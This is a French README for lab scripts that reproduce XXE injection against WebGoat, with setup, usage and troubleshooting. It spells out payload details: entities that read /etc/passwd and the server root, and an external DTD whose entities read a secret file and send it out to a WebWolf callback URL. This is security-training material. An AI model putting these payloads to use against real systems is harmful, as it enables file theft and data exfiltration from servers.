# Démonstration d’exploitation XXE

Ce dépôt contient deux scripts Python pour reproduire des injections **XXE** (*XML External Entity*) dans un laboratoire de sécurité. À utiliser uniquement sur un environnement de test ou une cible pour laquelle vous disposez d’une autorisation.

Une XXE se produit lorsqu’un analyseur XML accepte de résoudre des entités externes contrôlées par l’utilisateur. Les exemples de ce dépôt tentent de lire des ressources du serveur à l’aide du protocole `file://` ou de provoquer une requête HTTP sortante.

## Contenu du dépôt

| Fichier | Rôle |
| --- | --- |
| `exploit.py` | XXE classique avec un cookie de session fourni manuellement ; tente de lire `/etc/passwd`. |
| `exploit_v2.py` | Authentification à WebGoat, puis exécution successive des exercices XXE simple et aveugle. |
| `attack.dtd` | DTD externe utilisée pour tenter de transmettre un fichier du laboratoire à WebWolf. |
| `presentation-xxe.html` | Présentation pédagogique à ouvrir dans un navigateur. |
| `requirements.txt` | Dépendance Python : `requests>=2.32.5,<3`. |

## Installation

Prérequis : Python 3 avec `pip` et `venv`, ainsi qu’un laboratoire accessible depuis votre machine. Pour `exploit_v2.py`, préparez une instance WebGoat, un compte utilisateur et une instance WebWolf accessible depuis WebGoat.

Depuis le dossier du dépôt :

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install -r requirements.txt
```

Sous Windows PowerShell, activez l’environnement avec `.venv\Scripts\Activate.ps1`.

## 1. XXE classique avec `exploit.py`

Ce script envoie une requête `POST` contenant du XML à l’URL et au point d’entrée indiqués. Le document déclare une entité externe ciblant `file:///etc/passwd`, puis l’insère dans le champ `productId` d’un élément `stockCheck`.

Il est adapté à un laboratoire acceptant ce format XML, notamment l’exercice de lecture de fichiers mentionné dans le code. Il ne détecte pas automatiquement le format attendu par une application.

1. Connectez-vous au laboratoire dans votre navigateur.
2. Récupérez la valeur du cookie nommé `session` dans les outils de développement.
3. Lancez le script en remplaçant les valeurs d’exemple :

```bash
python exploit.py \
  --url 'http://localhost:8080' \
  --endpoint '/product/stock' \
  --session-id 'VALEUR_DU_COOKIE_SESSION'
```

| Option obligatoire | Description |
| --- | --- |
| `--url` | URL de base du laboratoire, avec le protocole et éventuellement le port. |
| `--endpoint` | Chemin du point d’entrée acceptant le XML ; `/product/stock` est un exemple à adapter. |
| `--session-id` | Valeur du cookie `session`, sans le préfixe `session=`. |

Le script affiche le code HTTP et le corps de la réponse. La présence du contenu de `/etc/passwd` dans cette réponse permet de constater la lecture du fichier. Un code HTTP `200` seul ne prouve pas une XXE. Le script n’effectue pas de validation automatique du succès et n’interprète pas les erreurs HTTP comme des exceptions.

Le nom du cookie, le fichier ciblé et la structure XML sont fixés dans le code. Ce script ne prend pas directement en charge le cookie `JSESSIONID` de WebGoat.

## 2. Exercices WebGoat avec `exploit_v2.py`

### Préparer le scénario aveugle

Le script lance systématiquement les deux scénarios. Préparez donc la DTD avant de l’exécuter : aucune option ne permet de sélectionner uniquement l’exercice simple.

Les valeurs suivantes sont **codées en dur** et doivent correspondre à votre laboratoire :

| Emplacement | Valeur actuelle | Adaptation nécessaire |
| --- | --- | --- |
| `exploit_v2.py`, fonction `exploit_blind_xxe` | `http://host.docker.internal:9090/WebWolf/files/abdelbaki/attack.dtd` | Adresse de WebWolf joignable depuis WebGoat et nom du compte hébergeant la DTD. |
| `attack.dtd`, entité `%file` | `file:///home/webgoat/.webgoat-2026.5/XXE/abdelbaki/secret.txt` | Chemin du fichier de l’exercice, selon la version installée et l’utilisateur. |
| `attack.dtd`, entité `%eval` | `http://127.0.0.1:9090/WebWolf/landing?text=%file;` | Adresse du point de réception WebWolf joignable depuis le processus WebGoat. |

Le paramètre `--username` sert à la connexion : il ne remplace pas automatiquement `abdelbaki` dans le script ou la DTD.

1. Connectez-vous à WebGoat et préparez l’exercice XXE aveugle, notamment le fichier attendu par la leçon.
2. Modifiez les valeurs ci-dessus selon votre installation.
3. Connectez-vous à WebWolf et téléversez le fichier `attack.dtd` modifié dans la zone de fichiers de votre compte.
4. Vérifiez que l’adresse de téléchargement correspond exactement à celle utilisée dans `exploit_v2.py`.
5. Ouvrez la vue des requêtes entrantes de WebWolf pour observer le rappel HTTP.

Les adresses sont résolues **depuis WebGoat**. Dans un conteneur, `127.0.0.1` désigne ce même conteneur, pas automatiquement votre ordinateur ou un autre conteneur. L’adresse `host.docker.internal` doit également être disponible dans votre environnement ; adaptez ces hôtes à votre réseau.

### Exécuter le script

Exemple pour une instance locale déjà démarrée :

```bash
python exploit_v2.py \
  --url 'http://localhost:8080' \
  --username 'UTILISATEUR_WEBGOAT' \
  --password 'MOT_DE_PASSE_WEBGOAT'
```

| Option obligatoire | Description |
| --- | --- |
| `--url` | Origine du serveur WebGoat, sans ajouter `/WebGoat` : le script ajoute lui-même ce chemin. |
| `--username` | Nom d’un compte WebGoat existant. |
| `--password` | Mot de passe de ce compte. |

Le déroulement est le suivant :

1. Connexion via `/WebGoat/login`, avec vérification d’une redirection `302` et de la présence d’un cookie `JSESSIONID`. Le cookie est conservé dans une session HTTP.
2. Envoi d’un commentaire de contrôle à `/WebGoat/xxe/simple`, puis d’un XML contenant une entité vers `file:///` pour tenter de lire le répertoire racine du serveur.
3. Envoi d’un commentaire de contrôle à `/WebGoat/xxe/blind`, puis d’un XML chargeant la DTD externe depuis WebWolf.
4. La DTD tente de lire le fichier `secret.txt` du laboratoire et d’envoyer son contenu dans le paramètre `text` d’une requête vers `/WebWolf/landing`.

### Interpréter les résultats et les limites

- Le message `Login response accepted` indique que les premiers contrôles de connexion ont réussi ; l’accès à la leçon est vérifié ensuite.
- `ACID test passed...` correspond à une réponse précise de WebGoat au commentaire de contrôle. Ce message ne prouve pas la présence d’une vulnérabilité.
- Le message `Target is vulnerable to XXE!` dépend des champs JSON `attemptWasMade` et `feedback`, et d’un texte de félicitations anglais exact. Une autre réponse peut ne produire aucun verdict explicite.
- Pour l’exercice aveugle, vérifiez les requêtes entrantes dans WebWolf et le paramètre `text`. Le script n’affiche pas le fichier récupéré et ne consulte pas les rappels HTTP.
- Le XML aveugle référence `&xxe;`, mais la DTD fournie ne déclare pas cette entité. L’analyse XML peut donc échouer, même si un rappel a déjà eu lieu pendant le chargement de la DTD. Le scénario fourni ne garantit pas la validation de la leçon.
- Le contenu du fichier est inséré directement dans une URL, sans encodage. Certains caractères peuvent empêcher sa transmission correcte.

## Aide et dépannage

Pour afficher les options disponibles :

```bash
python exploit.py --help
python exploit_v2.py --help
```

| Symptôme | Vérification |
| --- | --- |
| `ModuleNotFoundError: No module named 'requests'` | Activez l’environnement virtuel et installez `requirements.txt` avec le même interpréteur Python. |
| Connexion refusée ou délai dépassé | Vérifiez que le laboratoire est démarré et que l’hôte et le port sont corrects. Chaque requête utilise un délai de 30 secondes. |
| `Unexpected login response`, redirection vers la connexion ou absence de `JSESSIONID` | Vérifiez les identifiants, l’URL de base et la compatibilité du flux de connexion WebGoat avec le script. |
| `Expected JSON but received` | Le serveur renvoie peut-être une page de connexion, une page d’erreur ou un chemin inexistant. Consultez l’extrait de réponse affiché. |
| Aucun rappel dans WebWolf | Vérifiez l’URL de la DTD, son téléversement, le chemin du fichier et l’accessibilité réseau depuis WebGoat. |
| Aucun message de succès malgré une réponse HTTP `200` | Vérifiez le résultat dans le laboratoire : le script attend des valeurs JSON précises et n’affiche pas toutes les réponses. |

Les redirections automatiques sont désactivées dans les deux scripts. Dans `exploit_v2.py`, une exception HTTP ou une erreur de validation arrête l’exécution ; si elle survient pendant l’exercice simple, l’exercice aveugle n’est pas lancé.
